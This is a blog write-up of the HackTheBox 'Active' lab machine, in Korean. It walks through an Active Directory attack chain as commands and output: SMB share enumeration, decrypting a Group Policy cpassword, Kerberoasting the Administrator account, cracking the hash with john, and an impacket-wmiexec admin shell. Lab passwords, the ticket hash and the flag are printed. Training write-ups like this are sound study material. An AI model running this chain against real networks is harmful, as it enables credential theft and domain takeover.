---
layout: post
title: "[HTB][AD][Easy] Active (개인 풀이)"
date:   2026-11-09 20:59:02 +09:00
categories: [AD, Easy]
---
## 개요

## 모의해킹내용

### 정보수집
```
└─$ sudo masscan -p1-65535 TARGET_IP --rate=1000 --interface tun1 > ports
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2026-02-26 13:07:02 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [65535 ports/host]

└─$ ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | 
sort -n | tr '\n' ',' | sed 's/,$//')

└─$ nmap -Pn -sV -sC -p$ports TARGET_IP                                  
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-26 08:10 EST
Nmap scan report for TARGET_IP
Host is up (0.28s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-02-26 13:10:57Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49162/tcp open  msrpc         Microsoft Windows RPC
49166/tcp open  msrpc         Microsoft Windows RPC
49168/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required
|_clock-skew: -1s
| smb2-time: 
|   date: 2026-02-26T13:11:59
|_  start_date: 2026-02-26T12:00:47

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 87.27 seconds
```

```
└─$ echo "TARGET_IP  active.htb" | sudo tee -a /etc/hosts
TARGET_IP  active.htb
```

```
└─$  smbclient -L //TARGET_IP
Password for [WORKGROUP\kali]:
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Replication     Disk      
        SYSVOL          Disk      Logon server share 
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to TARGET_IP failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

```
└─$ smbmap -H TARGET_IP                                                  

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

.
.
.

shares...                                                                              [-] Enumer           
[+] IP: TARGET_IP:445        Name: active.htb                Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        Replication                                             READ ONLY
        SYSVOL                                                  NO ACCESS       Logon server share 
        Users                                                   NO ACCESS
```


```
└─$ smbclient //TARGET_IP/Replication                        
Password for [WORKGROUP\kali]:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> RECURSE ON
smb: \> PROMPT OFF
smb: \>  mget *
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\GPT.INI of size 23 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\GPT.INI of size 22 as active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Group Policy\GPE.INI of size 119 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy/GPE.INI (0.1 KiloBytes/sec) (average 0.0 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Registry.pol of size 2788 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol (2.4 KiloBytes/sec) (average 0.6 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml (0.4 KiloBytes/sec) (average 0.6 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 1098 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (0.8 KiloBytes/sec) (average 0.6 KiloBytes/sec)
getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 3722 as active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (3.1 KiloBytes/sec) (average 0.9 KiloBytes/sec)
smb: \> SMBecho failed (NT_STATUS_CONNECTION_RESET). The connection is disconnected now
```


```
└─$ cat Groups.xml                
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```
### 초기침투

```
└─$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18
```



```
└─$ smbmap -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18 -H TARGET_IP

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap
.
.
.

[+] IP: TARGET_IP:445        Name: active.htb                Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        Replication                                             READ ONLY
        SYSVOL                                                  READ ONLY       Logon server share 
        Users                                                   READ ONLY
```

```
└─$ smbclient -U SVC_TGS%GPPstillStandingStrong2k18 //TARGET_IP/Users
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Sat Jul 21 10:39:20 2018
  ..                                 DR        0  Sat Jul 21 10:39:20 2018
  Administrator                       D        0  Mon Jul 16 06:14:21 2018
  All Users                       DHSrn        0  Tue Jul 14 01:06:44 2009
  Default                           DHR        0  Tue Jul 14 02:38:21 2009
  Default User                    DHSrn        0  Tue Jul 14 01:06:44 2009
  desktop.ini                       AHS      174  Tue Jul 14 00:57:55 2009
  Public                             DR        0  Tue Jul 14 00:57:55 2009
  SVC_TGS                             D        0  Sat Jul 21 11:16:32 2018

                5217023 blocks of size 4096. 278935 blocks available
smb: \> cd SVC_TGS/Desktop
smb: \SVC_TGS\Desktop\> ls
  .                                   D        0  Sat Jul 21 11:14:42 2018
  ..                                  D        0  Sat Jul 21 11:14:42 2018
  user.txt                           AR       34  Thu Feb 26 07:01:59 2026

                5217023 blocks of size 4096. 278935 blocks available
smb: \SVC_TGS\Desktop\> get user.txt
getting file \SVC_TGS\Desktop\user.txt of size 34 as user.txt (0.0 KiloBytes/sec) (average 0.0 KiloByte/sec)
smb: \SVC_TGS\Desktop\> SMBecho failed (NT_STATUS_CONNECTION_RESET). The connection is disconnected now
```
```
└─$ cat user.txt
82e178d892e061bbf3ba65107c07ae56
```


### 권한상승

```
└─$ ldapsearch -x -H 'ldap://TARGET_IP' -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' -b "dc=active,dc=htb" -s sub "(&(objectCategory=person)(objectClass=user)(!             
(useraccountcontrol:1.2.840.113556.1.4.803:=2)))" samaccountname | grep sAMAccountName
sAMAccountName: Administrator
sAMAccountName: SVC_TGS
```

```
└─$ impacket-GetADUsers -all active.htb/svc_tgs -dc-ip TARGET_IP
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Querying TARGET_IP for information about domain.
Name                  Email                           PasswordLastSet      LastLogon           
--------------------  ------------------------------  -------------------  -------------------
Administrator                                         2018-07-18 15:06:40.351723  2026-02-26 07:02:03.338577 
Guest                                                 <never>              <never>             
krbtgt                                                2018-07-18 14:50:36.972031  <never>             
SVC_TGS                                               2018-07-18 16:14:38.402764  2018-07-21 10:01:30.320277
```

```
└─$ ldapsearch -x -H 'ldap://TARGET_IP' -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' -b "dc=active,dc=htb" -s sub "(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2))(serviceprincipalname=*/*))" serviceprincipalname | grep -B 1 servicePrincipalName
dn: CN=Administrator,CN=Users,DC=active,DC=htb
servicePrincipalName: active/CIFS:445
```

```
└─$ impacket-GetUserSPNs active.htb/svc_tgs -dc-ip TARGET_IP
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2026-02-26 07:02:03.338577
```

```
└─$ impacket-GetUserSPNs active.htb/svc_tgs -dc-ip TARGET_IP -request
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2026-02-26 07:02:03.338577             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$f6d748a652978dfb18cf48d71cdd7977$ab4bcb8911f76bcfda6c3e368b39cf93bdda8a2d82daa6e7611f746fcab1dba2a3417395806dec76225e9aa3f61e75815e208ced007fc4394401e9dcdab5308f7bc95d8a45755a4eb84d024b7703a869d58e30b0037a0f28d435565790e1ac28b6ebc5204296114b52188e824fc452dd1109b9a9543ab541d47ad13cf3d614798d586c04fdb6590e4c4b80778833157aa419d0aa9da5fb04b3a6168d6a414cb14f13ab8e04681036036aee44c314d88d493dd8418f16d3d63f00c47478247c59eecbe1c9f22980b04a48e6723a2ac3647cba58551c69e4e2f6fcf3b65ddacb7e7791eae691448168f776247600c13d08c689121b901cca46bd47e0cb51600936026af3909e265587d1341ea513de188dc0d9c489c6027904941370d2ab9626a7a394ddfdf5136b5f8b5bad6bcbec760a2e942d696f3ab6a75a2e5f819ab0ce9edd712a6a152717260e2cb23890689fe174e883d397f0ea70c86c6158bbd245b252a0e05856f8bf715a18c6a1303ee49f0fbcb7ffe04a57330ee749855452cbd83d7366dc6b284853b42b787d5b38a38fc7f83e64a57fbea41f77c35188f503aab89a187f1233316ae526132a65cf9dc40a6256dc3506becdc06bc5a77e121a3a0f07d69e073b296f23e13283a67ca6548ba8c54837c130c7371936db919793e37ef370891ae6dcb3ef1cf186ae6bdaaef5d11c2f77444dba98a8356d28ce98530b1755c0e5f80e5dbc358491b0212dfd566b8c44e7491aae3a9e621be9393fdcf2b05e72f08e4162b1c654a181e7bb2007e9cb5a52e71af814db3e05d7fd96b3ae8b2c750a4771a104d28e4d571ed5ad53b7924cd22fefac1ddfc7238f12eaf1c50eaa0745224bc17b8ded1e7615f764c01e468b3f3518d47b862609a80ee69ca89abb93389c2877210d5369490e754b1312a4b0d3f6536c6171aae4d9e61d1b86f58c26c20147cda09df49ad1c5f22d671cf97791e3ebf4b66e9af290eebe68f10570edd48b76abedc2136ee6e02d64fc7207536ebc1e22415d9d97cccd6584445f0aaf4bdac85dceb32405489cc1950bb89e89e9aaa720274cb24dafb3b187820b9a79f0de063d614a9cd122d7dfb39bb899d98ea3ca01c7b2dd86f2c750622021de77b7e408bb51289d8bab4385acdb14433d5d9393caae91fa9671a54a9c60c2ea86ffcc41a99e5add93f05fdbfd4dd27147b9f17a4a410c503ec6d229e8d9ec7829ba805c463d0d034c910168369a0c433f20bcb9095418
```

```
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Ticketmaster1968 (?)     
1g 0:00:00:07 DONE (2026-02-26 09:09) 0.1345g/s 1418Kp/s 1418Kc/s 1418KC/s Tiffani1432..Tiago_18
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

```
└─$ impacket-wmiexec active.htb/administrator:Ticketmaster1968@TARGET_IP
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv2.1 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
active\administrator
```
